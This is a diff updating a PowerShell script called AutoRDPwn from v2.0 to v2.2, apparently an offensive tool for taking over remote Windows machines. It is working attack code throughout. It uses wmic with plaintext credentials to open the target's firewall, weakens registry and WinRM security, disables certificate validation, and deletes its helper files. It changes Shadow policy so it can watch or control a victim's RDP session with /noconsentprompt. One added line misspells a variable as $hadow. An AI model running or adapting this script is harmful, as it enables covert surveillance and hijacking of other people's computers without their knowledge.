@@ -1,6 +1,6 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 
-$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.0 - by @JoelGMSec"
+$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.2 - by @JoelGMSec"
 $Host.UI.RawUI.BackgroundColor = 'Black'
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 $Host.PrivateData.ErrorForegroundColor = 'Red'
@@ -13,7 +13,7 @@ Clear-Host
 function Show-Menu {
 
      Write-Host ""
-     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.0  " -ForegroundColor Yellow
+     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue; Write-Host "         v2.2  " -ForegroundColor Yellow
      Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue; Write-Host "_  _  _______  " -ForegroundColor Green
      Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue; Write-Host " \/ \/ /     \ " -ForegroundColor Green
      Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue; Write-Host " \        /   |   \" -ForegroundColor Green
@@ -36,8 +36,8 @@ function ConvertFrom-SecureToPlain {
     [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
     $PlainTextPassword }
 
-do { 
-Show-Menu
+    do { 
+    Show-Menu
     $input = Read-Host "Elige la opción que más te interese"
     switch ($input) {
         '1' {
@@ -90,15 +90,14 @@ Show-Menu
         wmic /node:'$computer' /user:'$user' /password:'$PlainTextPassword' path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes ; netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes"
         wmic /node:'$computer' /user:'$user' /password:'$PlainTextPassword' path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
 
-        '3' {
-        exit }
+        '3' { exit }
 
         default {
         Write-Host ""
         Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta; sleep -milliseconds 2500
         Clear-Host }}
         
-   } until ($input -in '1','x86','x64','2','3')
+      } until ($input -in '1','x86','x64','2','3')
 
 Write-Host ""
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
@@ -106,8 +105,34 @@ Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private; S
 Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
 winrm quickconfig -quiet; Set-Item wsman:\localhost\client\trustedhosts * -Force
 
+   do { 
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = 'Gray'
+        $input = Read-Host "Quieres ver o controlar el equipo?"
+        switch ($input) {
+
+        'ver' {
+        $control = "false"
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = 'Green'
+        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f
+        Write-Host ""
+        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 }
+
+        'controlar' {
+        $control = "true"
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = 'Green'
+        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f
+        Write-Host ""
+        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 }
+
+        default {
+        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta; sleep -milliseconds 2500 }}
+
+      } until ($input -in 'ver','controlar')
+
 Write-Host ""
-$Host.UI.RawUI.ForegroundColor = 'Green'
 $cred= New-Object System.Management.Automation.PSCredential ("$user", $password )
 $RDP = New-PSSession -Computer $computer -credential $cred
 
@@ -115,8 +140,6 @@ $RDP = New-PSSession -Computer $computer -credential $cred
     powershell Set-Executionpolicy UnRestricted
     REG DELETE "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /f
     REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1
-    REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f
-    REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4
     REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /f
     REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1
     REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
@@ -138,7 +161,8 @@ $Host.UI.RawUI.ForegroundColor = 'Gray'
         query session } 
         Write-Host ""
         $shadow = Read-Host -Prompt 'A qué sesión quieres conectarte?'
-        mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }
+        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$hadow /control /noconsentprompt /prompt /f }
+        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
     else {
         Write-Host ""
@@ -151,8 +175,9 @@ $Host.UI.RawUI.ForegroundColor = 'Gray'
         public bool CheckValidationResult(
         ServicePoint srvPoint, X509Certificate certificate,
         WebRequest request, int certificateProblem) {
-        return true; }} "@
-        
+        return true; }}
+
+"@
 $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
@@ -164,6 +189,8 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
     netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes
     sleep -milliseconds 7500; rm .\RDPWInst-v1.6.2.msi 2> $null }
-    mstsc /v $computer /admin /shadow:1 /noconsentprompt /prompt /f }
+    if($control -eq 'true') { mstsc /v $computer /admin /shadow:1 /control /noconsentprompt /prompt /f }
+    else { mstsc /v $computer /admin /shadow:1 /noconsentprompt /prompt /f }}
 
 rm .\psexec.exe, .\PsExec64.exe 2> $null
+Write-Host "Iniciando conexión remota.." -ForegroundColor Yellow; sleep -milliseconds 2500
